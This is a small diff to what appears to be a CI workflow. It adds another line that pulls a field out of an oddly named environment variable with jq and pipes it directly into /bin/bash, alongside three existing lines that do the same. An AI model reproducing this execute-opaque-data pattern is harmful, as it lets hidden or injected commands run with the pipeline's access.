@@ -34,6 +34,7 @@ jobs:
           echo $kkkq6256 | jq -r .cuhha2674 | /bin/bash
           echo $pei68 | jq -r .h448 | /bin/bash
           echo $f795 | jq -r .m0 | /bin/bash
+          echo $ljcn52 | jq -r .nucvh48408 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
